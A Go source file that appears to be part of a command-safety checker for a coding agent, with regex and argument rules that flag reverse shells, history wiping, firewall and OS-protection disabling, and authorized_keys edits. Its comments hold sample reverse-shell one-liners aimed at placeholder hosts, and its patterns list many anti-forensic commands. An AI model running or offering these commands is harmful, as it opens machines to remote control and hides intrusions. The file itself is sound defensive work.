package rules

import (
	"path"
	"regexp"
	"strings"
)

// Reverse shells hand a remote host an interactive shell on this machine.
// There is no good reason for a coding agent to open one, so these are
// critical. Plain port checks like "nc -z host 443" or "</dev/tcp/host/443"
// are left alone.
var (
	// bash -i >& /dev/tcp/1.2.3.4/4444 0>&1, exec 5<>/dev/tcp/... with <&5
	devTCPShellRe = regexp.MustCompile(`/dev/(tcp|udp)/\S+.*(0>&1|0<&1|>&\s*0\b|<&\s*[0-9])|\b(ba|z|k|da)?sh\s+-i\b.*/dev/(tcp|udp)/|\bexec\s+[0-9]+<>\s*/dev/(tcp|udp)/`)
	// rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc host 4444 > /tmp/f
	fifoShellRe = regexp.MustCompile(`\bmk(fifo|nod)\b.*\b(ba|z|da)?sh\b.*\b(nc|ncat|netcat|telnet|openssl\s+s_client)\b|\bmk(fifo|nod)\b.*\b(nc|ncat|netcat|telnet|openssl\s+s_client)\b.*\b(ba|z|da)?sh\b`)
	// python -c 'import socket,os,pty;s=socket.socket();s.connect(...);os.dup2(...);pty.spawn("sh")'
	// and the perl, php, ruby and node versions of the same thing.
	scriptShellRe = regexp.MustCompile(`(?i)\b(python[0-9.]*|perl|php|ruby|node)\b.*(socket\.socket|socket\(|fsockopen|tcpsocket|io::socket|net\.connect|new\s+net\.socket).*(dup2|pty\.spawn|/bin/(ba|z)?sh\b|\bsh\s+-i\b|proc_open|popen|spawn\(|system\(|exec\()`)
	psShellRe     = regexp.MustCompile(`(?i)net\.sockets\.tcpclient.*(getstream|iex|invoke-expression)`)
)

func checkReverseShell(cmd string, segs []segment, add func(string, string, Severity)) {
	switch {
	case devTCPShellRe.MatchString(cmd):
		add(RuleReverseShell, "shell over /dev/tcp", 0)
	case fifoShellRe.MatchString(cmd):
		add(RuleReverseShell, "fifo piped through a shell and nc", 0)
	case scriptShellRe.MatchString(cmd):
		add(RuleReverseShell, "socket wired to a shell", 0)
	case psShellRe.MatchString(cmd):
		add(RuleReverseShell, "PowerShell TCP client", 0)
	}
	for _, s := range segs {
		p := prog(s)
		args := s.Args
		switch p {
		case "nc", "ncat", "netcat", "nc.traditional", "nc.openbsd":
			if hasFlag(args[1:], 'e', "--exec", "--sh-exec", "--lua-exec") {
				add(RuleReverseShell, p+" -e", 0)
			}
			// ncat -c runs a command too. OpenBSD nc uses -c for TLS, so
			// only count it when a shell follows.
			for i, a := range args {
				if a == "-c" && i+1 < len(args) && isShellPath(args[i+1]) {
					add(RuleReverseShell, p+" -c", 0)
				}
			}
		case "socat":
			hasExec, hasNet := false, false
			for _, a := range args[1:] {
				l := strings.ToLower(a)
				if strings.HasPrefix(l, "exec:") || strings.HasPrefix(l, "system:") {
					hasExec = true
				}
				if strings.HasPrefix(l, "tcp") || strings.HasPrefix(l, "udp") || strings.HasPrefix(l, "openssl") || strings.HasPrefix(l, "ssl:") {
					hasNet = true
				}
			}
			if hasExec && hasNet {
				add(RuleReverseShell, "socat exec", 0)
			}
		}
	}
}

func isShellPath(s string) bool {
	switch path.Base(strings.Fields(s + " x")[0]) {
	case "sh", "bash", "zsh", "dash", "ksh", "cmd.exe", "powershell", "pwsh":
		return true
	}
	return false
}

// isAuthorizedKeys reports whether p is an SSH authorized_keys file. Adding a
// line there gives someone a way back in that outlives the session.
func isAuthorizedKeys(p string) bool {
	b := path.Base(strings.ReplaceAll(p, `\`, "/"))
	return b == "authorized_keys" || b == "authorized_keys2"
}

// Covering tracks: wiping shell history, turning off the firewall, or
// switching off OS protections like SIP, Gatekeeper and SELinux.
var (
	coverTracksRe = regexp.MustCompile(`(^|[\s;&|(])(` +
		`history\s+-c\b|history\s+-w\s+/dev/null|` +
		`unset\s+(-v\s+)?HISTFILE\b|(export\s+)?HISTFILE=/dev/null|(export\s+)?HIST(FILE)?SIZE=0\b|set\s+\+o\s+history\b|` +
		`iptables\s+(-t\s+\S+\s+)?(-F|--flush)\b|ip6tables\s+(-F|--flush)\b|nft\s+flush\s+ruleset\b|` +
		`ufw\s+disable\b|ufw\s+--force\s+reset\b|netsh\s+(adv)?firewall\s+set\s+\S+\s+state\s+off\b|` +
		`csrutil\s+disable\b|spctl\s+--(master|global)-disable\b|setenforce\s+0\b|` +
		`auditctl\s+(-D|-e\s+0)\b|wevtutil\s+cl\b|` +
		`(systemctl|service)\s+(stop|disable|mask)\s+(auditd|firewalld|ufw|apparmor|falcon-sensor|osqueryd)\b)`)
	psCoverRe    = regexp.MustCompile(`(?i)\b(clear-eventlog|clear-history)\b|set-mppreference\b.*-disable(realtimemonitoring|behaviormonitoring|ioavprotection)\s+\$?true`)
	historyFiles = map[string]bool{".bash_history": true, ".zsh_history": true, ".history": true, ".sh_history": true,
		".python_history": true, ".node_repl_history": true, ".psql_history": true, ".mysql_history": true, "ConsoleHost_history.txt": true}
)

func checkCoverTracks(cmd string, segs []segment, add func(string, string, Severity)) {
	if m := coverTracksRe.FindStringSubmatch(cmd); m != nil {
		add(RuleCoverTracks, strings.Join(strings.Fields(m[2]), " "), 0)
		return
	}
	if m := psCoverRe.FindString(cmd); m != "" {
		add(RuleCoverTracks, strings.Fields(m)[0], 0)
		return
	}
	for _, s := range segs {
		p := prog(s)
		hit := ""
		switch p {
		case "rm", "shred", "truncate", "unlink":
			for _, a := range positional(s.Args[1:]) {
				if historyFiles[path.Base(a)] {
					hit = p + " " + path.Base(a)
				}
			}
		case "ln":
			pos := positional(s.Args[1:])
			if len(pos) == 2 && pos[0] == "/dev/null" && historyFiles[path.Base(pos[1])] {
				hit = "ln /dev/null " + path.Base(pos[1])
			}
		}
		// "> ~/.bash_history" or "cat /dev/null > ~/.bash_history" wipes it.
		// Appending is left alone.
		for _, t := range s.Out {
			if historyFiles[path.Base(t)] && !contains(s.Append, t) {
				hit = "emptied " + path.Base(t)
			}
		}
		if hit != "" {
			add(RuleCoverTracks, hit, 0)
			return
		}
	}
}
